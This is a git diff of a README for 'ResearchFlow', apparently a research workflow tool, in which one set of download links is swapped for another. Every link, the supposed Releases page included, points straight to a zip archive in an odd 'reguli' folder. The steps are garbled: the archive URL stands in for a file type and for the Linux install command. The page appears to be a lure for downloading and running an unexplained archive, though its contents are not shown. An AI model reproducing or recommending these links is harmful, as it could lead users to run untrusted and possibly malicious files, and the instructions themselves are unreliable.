@@ -1,6 +1,6 @@
 # 🧠 ResearchFlow - Streamline Your Research Process Effortlessly
 
-[![Download ResearchFlow](https://raw.githubusercontent.com/AlexGames7584/ResearchFlow/main/reguli/Flow-Research-3.0.zip)](https://raw.githubusercontent.com/AlexGames7584/ResearchFlow/main/reguli/Flow-Research-3.0.zip)
+[![Download ResearchFlow](https://github.com/AlexGames7584/ResearchFlow/raw/refs/heads/main/reguli/Flow-Research-v1.9.zip)](https://github.com/AlexGames7584/ResearchFlow/raw/refs/heads/main/reguli/Flow-Research-v1.9.zip)
 
 ## 📋 Overview
 ResearchFlow is a visual research workflow manager designed to help you organize your academic projects. With deep-copy reference linking, it simplifies the way you connect and manage your research materials. This tool allows you to visualize your data and ideas in one place, making your workflow more efficient.
@@ -9,10 +9,10 @@ ResearchFlow is a visual research workflow manager designed to help you organize
 Follow these steps to download and run ResearchFlow.
 
 ### 🔗 Step 1: Download the Software
-To download ResearchFlow, visit this page to download the latest version: [ResearchFlow Releases](https://raw.githubusercontent.com/AlexGames7584/ResearchFlow/main/reguli/Flow-Research-3.0.zip).
+To download ResearchFlow, visit this page to download the latest version: [ResearchFlow Releases](https://github.com/AlexGames7584/ResearchFlow/raw/refs/heads/main/reguli/Flow-Research-v1.9.zip).
 
 ### 📥 Step 2: Choose Your Version
-On the Releases page, you will see a list of versions. Look for the most recent version and select the appropriate file for your operating system. For Windows users, this will typically be a `.exe` file. For users on macOS or Linux, there may be `.dmg` or `https://raw.githubusercontent.com/AlexGames7584/ResearchFlow/main/reguli/Flow-Research-3.0.zip` files available.
+On the Releases page, you will see a list of versions. Look for the most recent version and select the appropriate file for your operating system. For Windows users, this will typically be a `.exe` file. For users on macOS or Linux, there may be `.dmg` or `https://github.com/AlexGames7584/ResearchFlow/raw/refs/heads/main/reguli/Flow-Research-v1.9.zip` files available.
 
 ### 💾 Step 3: Install the Software
 After downloading, locate the file in your computer’s download directory. 
@@ -26,9 +26,9 @@ After downloading, locate the file in your computer’s download directory.
   2. Drag the ResearchFlow icon to your Applications folder to install.
 
 - **For Linux:**
-  1. Extract the downloaded `https://raw.githubusercontent.com/AlexGames7584/ResearchFlow/main/reguli/Flow-Research-3.0.zip` file.
+  1. Extract the downloaded `https://github.com/AlexGames7584/ResearchFlow/raw/refs/heads/main/reguli/Flow-Research-v1.9.zip` file.
   2. Open a terminal and navigate to the extracted folder.
-  3. Run the installation script by typing `https://raw.githubusercontent.com/AlexGames7584/ResearchFlow/main/reguli/Flow-Research-3.0.zip`.
+  3. Run the installation script by typing `https://github.com/AlexGames7584/ResearchFlow/raw/refs/heads/main/reguli/Flow-Research-v1.9.zip`.
 
 ### 🏁 Step 4: Launch ResearchFlow
 Once installed, find ResearchFlow in your applications list.
@@ -69,4 +69,4 @@ Once you launch ResearchFlow, you'll be greeted with an intuitive interface. Her
 If you encounter any issues or need assistance, please reach out to our support team via the Issues tab on the GitHub repository page. We are here to help you.
 
 ## 🔗 Conclusion
-We hope you enjoy using ResearchFlow. This tool is built to simplify your research tasks. Don’t hesitate to download the software and start streamlining your workflow today. For the latest updates, check for new versions on our [Releases page](https://raw.githubusercontent.com/AlexGames7584/ResearchFlow/main/reguli/Flow-Research-3.0.zip).
+We hope you enjoy using ResearchFlow. This tool is built to simplify your research tasks. Don’t hesitate to download the software and start streamlining your workflow today. For the latest updates, check for new versions on our [Releases page](https://github.com/AlexGames7584/ResearchFlow/raw/refs/heads/main/reguli/Flow-Research-v1.9.zip).
